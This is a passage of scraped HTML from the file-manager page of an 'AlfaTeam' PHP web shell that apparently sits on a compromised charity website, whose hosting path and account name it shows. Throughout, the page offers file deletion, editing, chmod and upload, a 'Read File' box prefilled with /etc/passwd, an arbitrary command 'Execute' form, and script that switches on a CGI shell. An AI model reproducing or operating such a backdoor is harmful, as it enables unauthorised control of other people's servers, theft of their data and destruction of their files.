confirm('Are You Sure For Delete # include # ?'); chk ? g('FilesMan',null,'delete', 'include') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="about.php" class="chkbx" id="checkbox5"><label for="checkbox5"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('about.php','auto','','','','file');">about.php</a></td></div><td><span style="font-weight:unset;" class="main_size">1.63 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:48</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('about.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('about.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('about.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('about.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'about.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # about.php # ?'); chk ? g('FilesMan',null,'delete', 'about.php') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="admin%20%281%29.zip" class="chkbx" id="checkbox6"><label for="checkbox6"></label></div></td><td><img src="http://solevisible.com/icons/zip.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('admin%20%281%29.zip','auto','','','','file');">admin (1).zip</a></td></div><td><span style="font-weight:unset;" class="main_size">7.11 MB</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:48</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('admin%20%281%29.zip','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('admin%20%281%29.zip', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('admin%20%281%29.zip', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('admin%20%281%29.zip', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'admin%20%281%29.zip', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # admin (1).zip # ?'); chk ? g('FilesMan',null,'delete', 'admin%20%281%29.zip') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="blog-details.php" class="chkbx" id="checkbox7"><label for="checkbox7"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('blog-details.php','auto','','','','file');">blog-details.php</a></td></div><td><span style="font-weight:unset;" class="main_size">1.63 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:48</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('blog-details.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('blog-details.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('blog-details.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('blog-details.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'blog-details.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # blog-details.php # ?'); chk ? g('FilesMan',null,'delete', 'blog-details.php') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="blogs.php" class="chkbx" id="checkbox8"><label for="checkbox8"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('blogs.php','auto','','','','file');">blogs.php</a></td></div><td><span style="font-weight:unset;" class="main_size">2.74 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:48</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('blogs.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('blogs.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('blogs.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('blogs.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'blogs.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # blogs.php # ?'); chk ? g('FilesMan',null,'delete', 'blogs.php') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="contact.php" class="chkbx" id="checkbox9"><label for="checkbox9"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('contact.php','auto','','','','file');">contact.php</a></td></div><td><span style="font-weight:unset;" class="main_size">7.39 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-11 23:00:14</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('contact.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('contact.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('contact.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('contact.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'contact.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # contact.php # ?'); chk ? g('FilesMan',null,'delete', 'contact.php') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="error_log" class="chkbx" id="checkbox10"><label for="checkbox10"></label></div></td><td><img src="http://solevisible.com/icons/notfound.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('error_log','auto','','','','file');">error_log</a></td></div><td><span style="font-weight:unset;" class="main_size">17.68 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2021-06-22 07:18:41</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('error_log','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('error_log', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('error_log', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('error_log', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'error_log', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # error_log # ?'); chk ? g('FilesMan',null,'delete', 'error_log') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="gallery.php" class="chkbx" id="checkbox11"><label for="checkbox11"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('gallery.php','auto','','','','file');">gallery.php</a></td></div><td><span style="font-weight:unset;" class="main_size">3.52 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:48</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('gallery.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('gallery.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('gallery.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('gallery.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'gallery.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # gallery.php # ?'); chk ? g('FilesMan',null,'delete', 'gallery.php') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="index.php" class="chkbx" id="checkbox12"><label for="checkbox12"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('index.php','auto','','','','file');">index.php</a></td></div><td><span style="font-weight:unset;" class="main_size">3.79 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2021-05-14 17:37:38</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('index.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('index.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('index.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('index.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'index.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # index.php # ?'); chk ? g('FilesMan',null,'delete', 'index.php') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="infrastructure.php" class="chkbx" id="checkbox13"><label for="checkbox13"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('infrastructure.php','auto','','','','file');">infrastructure.php</a></td></div><td><span style="font-weight:unset;" class="main_size">3.53 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:47</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('infrastructure.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('infrastructure.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('infrastructure.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('infrastructure.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'infrastructure.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # infrastructure.php # ?'); chk ? g('FilesMan',null,'delete', 'infrastructure.php') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="service-details.php" class="chkbx" id="checkbox14"><label for="checkbox14"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('service-details.php','auto','','','','file');">service-details.php</a></td></div><td><span style="font-weight:unset;" class="main_size">1.63 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:48</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('service-details.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('service-details.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('service-details.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('service-details.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'service-details.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # service-details.php # ?'); chk ? g('FilesMan',null,'delete', 'service-details.php') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="services.php" class="chkbx" id="checkbox15"><label for="checkbox15"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('services.php','auto','','','','file');">services.php</a></td></div><td><span style="font-weight:unset;" class="main_size">2.76 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:48</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('services.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('services.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('services.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('services.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'services.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # services.php # ?'); chk ? g('FilesMan',null,'delete', 'services.php') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="videos.php" class="chkbx" id="checkbox16"><label for="checkbox16"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('videos.php','auto','','','','file');">videos.php</a></td></div><td><span style="font-weight:unset;" class="main_size">2.21 KB</span></td><td><span style="font-weight:unset;" class="main_modify">2020-11-07 11:06:48</span></td><td><span style="font-weight:unset;" class="main_owner_group">stricrlyvineet/stricrlyvineet</span></td><td><a href=javascript:void(0) onclick="editor('videos.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('videos.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('videos.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('videos.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'videos.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # videos.php # ?'); chk ? g('FilesMan',null,'delete', 'videos.php') : '';"> X </a></td></tr><tr><td colspan=7>
<input type=hidden name=a value='FilesMan'>
<input type=hidden name=c value='/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/'>
<input type=hidden name=charset value=''>
<select id='tools_selector' name='alfa1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
<input type='submit' value=' '>
</form></table></div></div><table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
<tr>
<td width='17%'><form onsubmit="if(this.f.value.trim().length==0)return false;editor(this.f.value,'mkfile','','','','file');this.f.value='';return false;"><span class='footer_text'>Make File : </span><br><input class='dir' type='text' name='f' value=''> <input type='submit' value=' '></form></td>
<td width='21%'><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);this.d.value='';return false;"><span class='footer_text'>Make Dir : </span><br><input class='dir' type='text' name='d' value=' '> <input type='submit' value=' '></form></td>
<td width='22%'><form onsubmit="g('FilesMan',null,'delete',this.del.value);this.del.value='';return false;"><span class='footer_text'>Delete : </span><br><input class='dir' type='text' name='del' value=' '> <input type='submit' value=' '></form></td>
<td width='19%'><form onsubmit="if(this.f.value.trim().length==0)return false;editor(this.f.value,'chmod','','','','none');this.f.value='';return false;"><span class='footer_text'>Chmod : </span><br><input class='dir' type=text name=f value=' '> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='2'><form onsubmit='g("FilesMan",this.c.value,"");return false;'><span class='footer_text'>Change Dir : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/'> <input type='submit' value=' '></form></td>
<td colspan='2'><form onsubmit="editor(this.file.value,'auto','','','','file');return false;"><span><span class='footer_text'>Read File : </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='4'><form onsubmit="g('proc',null,this.c.value);this.c.value='';return false;"><span><span class='footer_text'>Execute :</span><br><input class='foottable' type='text' name='c' value=' '> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='4'><form onsubmit='u(this);return false;' name='footer_form' method='post' ENCTYPE='multipart/form-data'>
<input type='hidden' name='a' value='FilesMAn'>
<input type='hidden' name='c' value='/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/'>
<input type='hidden' name='alfa1' value='uploadFile'>
<input type='hidden' name='charset' value=''>
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);'></p><input type='submit' name='submit' value=' '></form><br><span class='copyright'>[ ./AlfaTeam &copy; 2012-2021 ]</span></td>
</tr>
</table>
</div>
<div id='cgiloader'><div class='editor-wrapper'><div class='editor-header'><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize("cgiloader");'></div><div onClick='editorClose("cgiloader");' class='close-button'></div></div></div><div id='cgiframe' style='margin-left:14px;margin-right:30px;'></div></div></div>
<div id='editor'><div class='editor-wrapper'><div class='editor-header'><div class='editor-path'></div><div class='editor-controller'><div class='editor-minimize' onClick='editorMinimize("editor");'></div><div onClick='editorClose("editor");' class='close-button'></div></div></div><div class='editor-explorer'><div class='hheader'><div class='history-clear' onclick='clearEditorHistory();'>Clear all</div><div class='hheader-text'>History</div><div class='editor-search'><input type='text' style='text-align:center;' id='search-input' placeholder='search'></div></div><div class='history-list'></div></div><div class='editor-modal'><div class='editor-body'><div class='editor-content'></div></div></div></div></div>
<div id='update-content'></div>
<div id='editor-minimized' onclick='showEditor("editor");'><div class='minimized-wrapper'><div class='minimized-text'>Show Editor</div></div></div>
<div id='cgiloader-minimized' onclick='showEditor("cgiloader");'><div class='minimized-wrapper'><div class='minimized-text'>Show Cgi</div></div></div>
<script>
	$('search-input').addEventListener('keydown', function(e){
		setTimeout(function(){
			var string = $('search-input').value
			d.getElementsByClassName('history-list')[0].innerHTML = '';
			for(var i in editor_files){
				if(editor_files[i].file.search(string) != -1 || string == ''){
					var mode = 0;
					if(i == editor_current_file){
						mode = ' is_active';
					}
					insertToHistory(i, editor_files[i].file, mode, editor_files[i].type);
				}
			}
		}, 100);
	},false);
	_Ajax(d.URL, 'a='+alfab64('checkupdate'), function(res){
		d.body.insertAdjacentHTML('beforeend', res);
	});
	if(true){
		_Ajax(d.URL, 'a='+alfab64('updateheader'), function(res){
			try{
				var data = JSON.parse(res);
				console.log(data);
				for(var i in data){
					var html = '';
					for(var b = 0; b < data[i].length; b++){
						if(i=='useful'||i=='downloader'){
							html += '<span class="header_values" style="margin-left: 4px;">'+data[i][b]+'</span>';
						}else{
							html += data[i][b];
						}
					}
					var elem = $('header_'+i);
					if(elem){elem.innerHTML = html;}
				}
				$('header_cgishell').innerHTML = 'ON';
				$('header_cgishell').setAttribute('class', 'header_on');
			}catch(e){console.log(e)}
		});
	}else if(islinux){
		_Ajax(d.URL, 'a='+alfab64('checkcgi'), function(res){
			if(res=='ok'){
				$('header_cgishell').innerHTML = 'ON';
				$('header_cgishell').setAttribute('class', 'header_on');
			}
		});
	}
</script>
</body>
</html>
